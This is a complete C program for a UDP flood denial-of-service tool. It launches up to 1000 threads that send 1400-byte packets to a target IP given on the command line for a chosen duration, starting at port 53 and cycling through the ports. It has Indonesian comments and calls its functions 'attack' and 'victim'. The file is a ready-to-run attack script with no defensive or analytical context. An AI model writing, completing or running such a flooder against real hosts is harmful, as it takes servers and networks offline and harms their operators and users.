#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_THREADS 1000
#define PACKET_SIZE 1400

char *target_ip;
int target_port = 53; // Port awal
int duration;

void *attack(void *arg) {
    struct sockaddr_in victim;
    victim.sin_family = AF_INET;
    victim.sin_port = htons(target_port);
    victim.sin_addr.s_addr = inet_addr(target_ip);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    char *packet = malloc(PACKET_SIZE);
    if (!packet) {
        close(sock);
        pthread_exit(NULL);
    }
    memset(packet, 0, PACKET_SIZE);

    time_t end = time(NULL) + duration;
    while (time(NULL) < end) {
        for (int i = 0; i < 100; i++) {
            sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&victim, sizeof(victim));
        }
        usleep(1000); // 1ms delay

        // Ganti port tiap detik
        target_port = (target_port + 1) % 65535;
        if (target_port == 0) target_port = 1; // Hindari port 0
        victim.sin_port = htons(target_port);
    }

    close(sock);
    free(packet);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <ip> <duration>\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];
    duration = atoi(argv[2]);
    if (duration <= 0) {
        fprintf(stderr, "Invalid duration.\n");
        return 1;
    }

    pthread_t thread_id[MAX_THREADS];

    for (int i = 0; i < MAX_THREADS; i++) {
        if (pthread_create(&thread_id[i], NULL, attack, NULL) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
        }
        usleep(300);
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(thread_id[i], NULL);
    }

    return 0;
}